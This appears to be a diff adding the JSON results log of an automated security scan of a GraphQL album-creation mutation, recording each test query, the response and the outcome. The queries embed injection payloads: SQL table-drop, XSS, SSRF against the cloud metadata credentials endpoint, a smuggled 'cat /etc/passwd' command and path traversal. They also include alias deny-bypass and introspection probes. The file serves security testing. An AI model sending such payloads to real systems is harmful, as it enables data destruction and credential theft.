@@ -1,0 +1,361 @@
+[
+  {
+    "query": {
+      "query": "\nmutation createAlbum {\n  createAlbum(input: { title: \"Summer Vacation 2025\", userId: 1 }) {\n    id\n    title\n    user {\n      id\n      name\n    }\n    photos {\n      data {\n        id\n        title\n        url\n      }\n      meta {\n        totalCount\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.855,
+    "timestamp": "2025-10-03T01:39:53.117091Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "createAlbum": {
+          "id": "101",
+          "title": "Summer Vacation 2025",
+          "user": {
+            "id": "1",
+            "name": "Leanne Graham"
+          },
+          "photos": {
+            "data": [],
+            "meta": null
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation createAlbum {\n  createAlbum(input: { title: \"Robert'); DROP TABLE albums; --\", userId: 1 }) {\n    id\n    title\n    user {\n      id\n      username\n    }\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.909,
+    "timestamp": "2025-10-03T01:39:56.501135Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "createAlbum": {
+          "id": "101",
+          "title": "Robert'); DROP TABLE albums; --",
+          "user": {
+            "id": "1",
+            "username": "Bret"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation createAlbum {\n  createAlbum(input: { title: \"<script>alert('xss-via-album')</script>\", userId: 2 }) {\n    id\n    title\n    user {\n      id\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.763,
+    "timestamp": "2025-10-03T01:39:59.164264Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "createAlbum": {
+          "id": "101",
+          "title": "<script>alert('xss-via-album')</script>",
+          "user": {
+            "id": "2",
+            "name": "Ervin Howell"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation createAlbum {\n  createAlbum(input: { title: \"CoverFromURL\", coverUrl: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\", userId: 3 }) {\n    id\n    title\n    photos {\n      data {\n        id\n        url\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.855,
+    "timestamp": "2025-10-03T01:40:02.639673Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"coverUrl\" is not defined by type \"CreateAlbumInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 47
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation createAlbum {\n  createAlbum(input: { title: \"backup; cat /etc/passwd || true\", userId: 4 }) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.727,
+    "timestamp": "2025-10-03T01:40:04.893638Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "createAlbum": {
+          "id": "101",
+          "title": "backup; cat /etc/passwd || true"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation createAlbum {\n  createAlbum(input: { title: \"../../etc/passwd\", userId: 5 }) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.714,
+    "timestamp": "2025-10-03T01:40:07.411193Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "createAlbum": {
+          "id": "101",
+          "title": "../../etc/passwd"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation createAlbum {\n  createAlbum(input: { title: \"<div><img src=x onerror=alert('html-inject')></div>\", userId: 6 }) {\n    id\n    title\n    user {\n      id\n      website\n    }\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.47,
+    "timestamp": "2025-10-03T01:40:10.730320Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "createAlbum": {
+          "id": "101",
+          "title": "<div><img src=x onerror=alert('html-inject')></div>",
+          "user": {
+            "id": "6",
+            "website": "ola.org"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation createAlbum {\n  createAlbum(input: { title: \"AccessControlTest - normal\", userId: 7 }) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.694,
+        "timestamp": "2025-10-03T01:40:14.280941Z",
+        "response_body": {
+          "data": {
+            "createAlbum": {
+              "id": "101",
+              "title": "AccessControlTest - normal"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.357,
+        "timestamp": "2025-10-03T01:40:14.638319Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "101",
+              "title": "AccessControlTest - aliased"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-03T01:40:14.638406Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.662,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation createAlbum {\n  s: createAlbum(input: { title: \"AccessControlTest - aliased\", userId: 7 }) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.36,
+        "timestamp": "2025-10-03T01:40:18.216889Z",
+        "response_body": {
+          "data": {
+            "createAlbum": {
+              "id": "101",
+              "title": "AccessControlTest - normal"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.683,
+        "timestamp": "2025-10-03T01:40:18.900029Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "101",
+              "title": "AccessControlTest - aliased"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-10-03T01:40:18.900119Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.679,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation createAlbum {\n  createAlbum(input: { title: \"IntrospectProbe\", userId: 8 }) {\n    id\n    title\n    __typename\n    user {\n      id\n      __typename\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.405,
+    "timestamp": "2025-10-03T01:40:21.670808Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "data": {
+        "createAlbum": {
+          "id": "101",
+          "title": "IntrospectProbe",
+          "__typename": "Album",
+          "user": {
+            "id": "8",
+            "__typename": "User",
+            "name": "Nicholas Runolfsdottir V"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation createAlbum {\n  createAlbum(input: { title: \"TypoFieldTest\", userId: 9 }) {\n    id\n    titl\n    usre {\n      id\n      nam\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.69,
+    "timestamp": "2025-10-03T01:40:24.634920Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"titl\" on type \"Album\". Did you mean \"title\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"usre\" on type \"Album\". Did you mean \"user\"?",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
